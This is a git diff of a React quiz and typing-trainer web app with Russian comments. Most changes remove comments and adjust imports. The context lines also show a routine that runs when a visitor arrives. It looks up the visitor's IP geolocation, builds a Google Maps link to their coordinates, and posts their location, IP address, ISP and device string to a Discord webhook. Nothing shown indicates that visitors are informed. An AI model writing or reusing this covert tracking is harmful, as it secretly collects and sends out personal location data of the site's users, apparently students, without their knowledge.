@@ -1,6 +1,14 @@
-// --- APP ---
-const { TypingTest } = window; // ДОБАВЛЕНО: Получаем тренажер из window
+// --- ВАЖНО: ИМПОРТЫ ИЗ ПРЕДЫДУЩИХ ФАЙЛОВ ---
+const { 
+  useState, useEffect, motion, AnimatePresence,
+  computeFingerprint, DISCORD_WEBHOOK, shuffleArray,
+  GooeyText, Button, Input,
+  AuthScreen, AdminPanel, ChatPanel,
+  TestQuestionCard, ReviewView, StatsView,
+  TypingTest // <--- Теперь тренажер корректно подгружается
+} = window;
 
+// --- APP ---
 function App() {
   const [view, setView] = useState('loading'); 
   const [theme, setTheme] = useState(localStorage.getItem('theme') || 'light');
@@ -24,7 +32,6 @@ function App() {
   
   const [teacherTests, setTeacherTests] = useState([]); 
 
-  // Новые состояния для Гамбургера и Чата
   const [isSidebarOpen, setIsSidebarOpen] = useState(false);
   const [isChatOpen, setIsChatOpen] = useState(false);
 
@@ -72,7 +79,6 @@ function App() {
           const ipData = await ipReq.json();
           const deviceInfo = navigator.userAgent;
 
-          // Формируем ссылку на Google Карты, если координаты доступны
           const mapsLink = ipData.latitude && ipData.longitude 
               ? `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}` 
               : null;
@@ -84,15 +90,10 @@ function App() {
                   title: "👁️ НОВЫЙ ПОСЕТИТЕЛЬ НА САЙТЕ", 
                   color: 16753920,
                   fields: [
-                      // Детальная локация
                       { name: "📍 Локация", value: `${ipData.country_name || 'Скрыто'}, ${ipData.region || 'Скрыто'}, ${ipData.city || 'Скрыто'}`, inline: false },
-                      // Ссылка на карту
                       { name: "🗺️ На карте", value: mapsLink ? `[📍 Открыть Google Maps](${mapsLink})` : 'Нет данных', inline: true },
-                      // IP адрес
                       { name: "🌐 IP Адрес", value: `\`${ipData.ip || 'Скрыто'}\``, inline: true },
-                      // Название интернет-провайдера (например, Uztelecom, Beeline)
                       { name: "📡 Провайдер", value: `\`${ipData.org || 'Скрыто'}\``, inline: true },
-                      // Устройство
                       { name: "💻 Устройство", value: `\`\`\`${deviceInfo}\`\`\``, inline: false }
                   ],
                   timestamp: new Date().toISOString()
@@ -374,7 +375,7 @@ function App() {
          <motion.div animate={{ x: [0, 100, -100, 0], y: [0, -100, 100, 0] }} transition={{ duration: 50, repeat: Infinity, ease: "easeInOut" }} style={{ position:'absolute', top:'30%', left:'30%', width:'40vw', height:'40vw', background:'radial-gradient(circle, rgba(251, 194, 235, 0.3) 0%, rgba(0,0,0,0) 70%)', filter: 'blur(50px)', borderRadius:'50%' }} />
       </div>
 
-      {/* ГАМБУРГЕР КНОПКА (С железобетонной фиксацией через отдельный CSS класс) */}
+      {/* ГАМБУРГЕР КНОПКА */}
       {!isAuthLoading && user && view === 'menu' && (
           <div className="mobile-burger-fixed">
               <Button variant="muted" onClick={() => setIsSidebarOpen(true)} style={{width: 54, height: 54, padding: 0, borderRadius: '16px', fontSize: 24, display: 'flex', alignItems: 'center', justifyContent: 'center', boxShadow: '0 4px 15px rgba(0,0,0,0.1)'}}>☰</Button>
@@ -386,27 +387,20 @@ function App() {
               <>
                   <motion.div initial={{opacity:0}} animate={{opacity:1}} exit={{opacity:0}} onClick={() => setIsSidebarOpen(false)} style={{position:'fixed', inset:0, background:'rgba(0,0,0,0.4)', backdropFilter:'blur(5px)', zIndex:2000}} />
                   <motion.div initial={{x:'-100%'}} animate={{x:0}} exit={{x:'-100%'}} transition={{type:'spring', damping:25, stiffness:200}} className="glass-sidebar" style={{ display: 'flex', flexDirection: 'column', padding: '20px' }}>
-                      {/* Шапка меню (Фиксированная) */}
+                      
                       <div style={{display:'flex', justifyContent:'space-between', alignItems:'center', paddingBottom: 10, borderBottom: '1px solid var(--glass-border)', flexShrink: 0}}>
                           <h2 style={{margin:0, fontSize: 22}}>Меню</h2>
                           <Button variant="muted" onClick={() => setIsSidebarOpen(false)} style={{width:44, height:44, padding:0, borderRadius:'50%'}}>✖</Button>
                       </div>
                       
-                      {/* Профиль (Фиксированный) */}
     <div style={{display: 'flex', alignItems: 'center', gap: '15px', padding: '15px 0', borderBottom: '1px solid var(--glass-border)', flexShrink: 0}}>
     <span style={{ fontSize: '30px' }}>👤</span>
-    
-    {/* Добавили flex: 1 и minWidth: 0, чтобы контейнер не выходил за рамки */}
     <div style={{ overflow: 'hidden', flex: 1, minWidth: 0 }}>
         <div style={{ fontSize: '11px', opacity: 0.6, textTransform: 'uppercase', fontWeight: 800 }}>Аккаунт</div>
-        
-        {/* Убрали обрезку текста из родителя и перенесли в отдельный <span> */}
         <div style={{ fontSize: '15px', fontWeight: 600, color: 'var(--text-main)', display: 'flex', alignItems: 'center', gap: '8px' }}>
             <span style={{ textOverflow: 'ellipsis', overflow: 'hidden', whiteSpace: 'nowrap' }}>
                 {userNickname || user?.email}
             </span>
-            
-            {/* Добавили flexShrink: 0, чтобы карандаш никогда не сжимался и не исчезал */}
             <span onClick={changeNickname} style={{cursor: 'pointer', fontSize: 14, opacity: 0.8, flexShrink: 0}} title="Изменить никнейм">
                 ✏️
             </span>
@@ -414,7 +408,6 @@ function App() {
     </div>
 </div>
 
-                      {/* Скроллируемая центральная часть с кнопками */}
                       <div style={{display: 'flex', flexDirection: 'column', gap: '10px', marginTop: 15, flex: 1, overflowY: 'auto', paddingRight: '5px'}}>
                           <Button variant="muted" onClick={() => setTheme(theme === 'dark' ? 'light' : 'dark')} style={{justifyContent: 'flex-start', padding: '0 20px', height: 54, minHeight: 54}}>
                               <span style={{marginRight: 10}}>{theme === 'dark' ? '☀️' : '🌙'}</span> Сменить тему
@@ -422,12 +415,9 @@ function App() {
                           <Button variant="teal" onClick={() => { setIsChatOpen(true); setIsSidebarOpen(false); }} style={{justifyContent: 'flex-start', padding: '0 20px', height: 54, minHeight: 54}}>
                               <span style={{marginRight: 10}}>💬</span> Открыть чат
                           </Button>
-
-                          {/* ДОБАВЛЕНО: Кнопка тренажера в бургер-меню */}
                           <Button variant="primary" onClick={() => { setView('typing'); setIsSidebarOpen(false); }} style={{justifyContent: 'flex-start', padding: '0 20px', height: 54, minHeight: 54}}>
                               <span style={{marginRight: 10}}>⌨️</span> Тренажер печати
                           </Button>
-
                           {isAdmin && (
                               <Button variant="red" onClick={() => { setView('admin'); setIsSidebarOpen(false); }} style={{justifyContent: 'flex-start', padding: '0 20px', height: 54, minHeight: 54}}>
                                   <span style={{marginRight: 10}}>🛡️</span> АДМИНКА
@@ -435,7 +425,6 @@ function App() {
                           )}
                       </div>
 
-                      {/* Кнопка ВЫЙТИ (Фиксированная в самом низу) */}
                       <div style={{paddingTop: '15px', paddingBottom: '10px', flexShrink: 0}}>
                           <Button variant="muted" onClick={() => { window.auth.signOut(); setIsSidebarOpen(false); }} style={{background: 'rgba(239, 68, 68, 0.1)', color: '#ef4444', height: 54}}>
                               ВЫЙТИ
@@ -484,7 +473,6 @@ function App() {
 
               <div style={{maxHeight:300, overflowY:'auto', margin:'0 0 20px 0', paddingRight:5}}>
                 
-                {/* ОТОБРАЖАЕМ МНОЖЕСТВО ТЕСТОВ ОТ ПРЕПОДАВАТЕЛЯ */}
                 {teacherTests.map(test => (
                   <div key={test.id} style={{display:'flex', gap:10, marginBottom:10}}>
                     <Button variant="muted" onClick={() => openTeacherAssignedTest(test)} style={{ flex:1, justifyContent:'flex-start', textAlign:'left', padding:'10px 15px', minWidth: 0, height: 'auto', minHeight: '54px', wordBreak: 'break-word', border: '1px solid #00c6ff' }}>
@@ -495,7 +483,6 @@ function App() {
                   </div>
                 ))}
 
-                {/* --- ЛОКАЛЬНЫЕ ТЕСТЫ --- */}
                 {sets.map(name => (
                   <div key={name} style={{display:'flex', gap:10, marginBottom:10}}>
                     <Button variant="muted" onClick={() => openSet(name)} style={{ flex:1, justifyContent:'flex-start', textAlign:'left', padding:'10px 15px', minWidth: 0, height: 'auto', minHeight: '54px', wordBreak: 'break-word' }}>
